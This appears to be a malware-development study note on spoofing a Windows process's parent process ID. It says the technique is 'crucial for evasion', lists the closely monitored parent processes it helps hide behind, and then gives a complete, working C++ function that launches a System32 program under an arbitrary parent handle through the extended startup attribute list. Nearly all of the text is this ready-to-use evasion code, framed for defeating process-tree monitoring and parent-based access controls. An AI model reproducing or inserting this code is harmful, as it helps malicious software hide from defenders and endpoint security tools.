# Spoofing PPID (Parent Process ID)

Spoofing the PPID, Parent Process Path and other PEB attributes and more(within Windows & different OS-es) is crucial for evasion!

why? obvious but:
- Some parent processes and parent-child relationship graphs are monitored more closely than others. Ex - `explorer.exe`, `cmd.exe`, `powershell.exe`, `wmiprvse.exe`, `svchost.exe`, etc.
- Some access controls are based on parent process.

!Q? Why is PEB modification allowed? Legit examples: Attaching debuggers, some defence products, etc. are doing it for "good" reasons.

Example:

```cpp
BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR                               lpPath               [MAX_PATH * 2];
	CHAR                               WnDr                 [MAX_PATH];

	SIZE_T                             sThreadAttList       = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList       = NULL;

	STARTUPINFOEXA                     SiEx                = { 0 };
	PROCESS_INFORMATION                Pi                  = { 0 };

	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	
	//-------------------------------------------------------------------------------
	
	// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);	

	// Allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL){
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
	// created using UpdateProcThreadAttribute - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;

	//-------------------------------------------------------------------------------

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&SiEx.StartupInfo,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;


	// Cleaning up
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

```